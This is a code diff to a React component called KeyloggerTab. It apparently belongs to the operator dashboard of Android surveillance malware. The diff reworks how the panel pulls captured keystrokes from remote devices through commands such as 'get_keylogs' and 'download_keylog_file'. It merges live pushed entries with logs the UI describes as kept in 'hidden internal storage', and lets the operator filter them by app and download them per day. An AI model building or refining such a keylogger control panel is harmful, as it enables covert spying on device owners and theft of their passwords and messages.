@@ -22,18 +22,28 @@ function getAppShortName(pkg) {
   return parts[parts.length - 1]?.slice(0, 2).toUpperCase() || '??';
 }
 
-export default function KeyloggerTab({ device, sendCommand, results }) {
+function dedupeByTimestampAndText(entries) {
+  const seen = new Set();
+  return entries.filter(e => {
+    const key = `${e.packageName}|${e.timestamp}|${e.text}`;
+    if (seen.has(key)) return false;
+    seen.add(key);
+    return true;
+  });
+}
+
+export default function KeyloggerTab({ device, sendCommand, results, keylogPushEntries }) {
   const deviceId  = device.deviceId;
   const isOnline  = device.isOnline;
 
-  const [liveLogs, setLiveLogs]       = useState([]);
+  const [storedLogs, setStoredLogs]   = useState([]);
   const [keylogFiles, setKeylogFiles] = useState([]);
   const [loading, setLoading]         = useState(false);
   const [filterPkg, setFilterPkg]     = useState('');
   const [autoScroll, setAutoScroll]   = useState(true);
-  const [viewMode, setViewMode]       = useState('live'); // 'live' | 'files'
+  const [viewMode, setViewMode]       = useState('live');
   const logEndRef = useRef(null);
-  const seenIds   = useRef(new Set());
+  const seenResultIds = useRef(new Set());
 
   const downloadBase64Text = (b64, filename) => {
     const raw = atob(b64);
@@ -46,25 +56,24 @@ export default function KeyloggerTab({ device, sendCommand, results }) {
     URL.revokeObjectURL(url);
   };
 
-  // Parse command results for keylog data
   useEffect(() => {
     const relevant = results.filter(r =>
       (r.command === 'get_keylogs' || r.command === 'list_keylog_files' || r.command === 'download_keylog_file') &&
       r.success && r.response
     );
     relevant.forEach(r => {
-      if (seenIds.current.has(r.id)) return;
-      seenIds.current.add(r.id);
+      if (seenResultIds.current.has(r.id)) return;
+      seenResultIds.current.add(r.id);
       try {
         const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
         if (r.command === 'get_keylogs' && data.logs) {
-          setLiveLogs(prev => {
-            const all = [...data.logs.reverse(), ...prev];
-            return all.slice(0, 2000);
-          });
+          setStoredLogs(data.logs);
         }
         if (r.command === 'list_keylog_files' && data.files) {
           setKeylogFiles(data.files);
+        }
+        if (r.command === 'download_keylog_file' && data.base64) {
+          downloadBase64Text(data.base64, `keylogs_${data.date}.txt`);
         }
       } catch (_) {}
     });
@@ -87,36 +96,26 @@ export default function KeyloggerTab({ device, sendCommand, results }) {
     }
   }, [isOnline]);
 
+  const combinedLogs = dedupeByTimestampAndText([
+    ...(keylogPushEntries || []),
+    ...storedLogs,
+  ]);
+
+  const filtered = filterPkg
+    ? combinedLogs.filter(l => (l.packageName || '').includes(filterPkg))
+    : combinedLogs;
+
+  const pkgList = [...new Set(combinedLogs.map(l => l.packageName).filter(Boolean))];
+
   useEffect(() => {
     if (autoScroll && logEndRef.current) {
       logEndRef.current.scrollIntoView({ behavior: 'smooth' });
     }
-  }, [liveLogs, autoScroll]);
-
-  const filtered = filterPkg
-    ? liveLogs.filter(l => (l.packageName || '').includes(filterPkg))
-    : liveLogs;
-
-  const pkgList = [...new Set(liveLogs.map(l => l.packageName).filter(Boolean))];
+  }, [combinedLogs.length, autoScroll]);
 
   const downloadDay = (date) => {
     sendCommand(deviceId, 'download_keylog_file', { date });
   };
-
-  // Watch for download_keylog_file responses
-  useEffect(() => {
-    results.forEach(r => {
-      if (r.command === 'download_keylog_file' && r.success && r.response && !seenIds.current.has('dl_' + r.id)) {
-        seenIds.current.add('dl_' + r.id);
-        try {
-          const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
-          if (data.base64) {
-            downloadBase64Text(data.base64, `keylogs_${data.date}.txt`);
-          }
-        } catch (_) {}
-      }
-    });
-  }, [results]);
 
   return (
     <div className="keylogger-tab">
@@ -149,7 +148,7 @@ export default function KeyloggerTab({ device, sendCommand, results }) {
               </button>
               <button className="kl-btn kl-btn-danger" onClick={() => {
                 sendCommand(deviceId, 'clear_keylogs', {});
-                setLiveLogs([]);
+                setStoredLogs([]);
               }} disabled={!isOnline}>
                 🧹 Clear
               </button>
@@ -162,6 +161,11 @@ export default function KeyloggerTab({ device, sendCommand, results }) {
         <div className="kl-feed-wrapper">
           <div className="kl-stats">
             <span>{filtered.length} entries</span>
+            {keylogPushEntries?.length > 0 && (
+              <span style={{ color: '#22d3ee', fontSize: 11, marginLeft: 8 }}>
+                ● {keylogPushEntries.length} live
+              </span>
+            )}
             {filterPkg && <span style={{ color: '#7c3aed' }}>· Filtered: {filterPkg}</span>}
             <span style={{ marginLeft: 'auto', color: '#94a3b8', fontSize: 11 }}>
               Stored per-day in hidden internal storage • Downloads by file
@@ -178,7 +182,7 @@ export default function KeyloggerTab({ device, sendCommand, results }) {
               </div>
             )}
             {filtered.map((entry, i) => (
-              <div key={i} className="kl-entry">
+              <div key={`${entry.timestamp}-${entry.packageName}-${i}`} className="kl-entry">
                 <div
                   className="kl-app-badge"
                   style={{ background: getAppColor(entry.packageName) + '22', borderColor: getAppColor(entry.packageName) + '66', color: getAppColor(entry.packageName) }}
@@ -211,16 +215,16 @@ export default function KeyloggerTab({ device, sendCommand, results }) {
           ) : (
             <div className="kl-file-list">
               {keylogFiles.map(f => (
-                <div key={f.date} className="kl-file-item">
+                <div key={f.date || f.name} className="kl-file-item">
                   <div className="kl-file-icon">📄</div>
                   <div className="kl-file-info">
-                    <div className="kl-file-date">{f.date}</div>
+                    <div className="kl-file-date">{f.date || f.name}</div>
                     <div className="kl-file-size">{f.size ? (f.size / 1024).toFixed(1) + ' KB' : '—'}</div>
                   </div>
                   <div className="kl-file-actions">
                     <button
                       className="kl-btn kl-btn-dl"
-                      onClick={() => downloadDay(f.date)}
+                      onClick={() => downloadDay(f.date || f.name)}
                       disabled={!isOnline}
                       title="Download as text file"
                     >
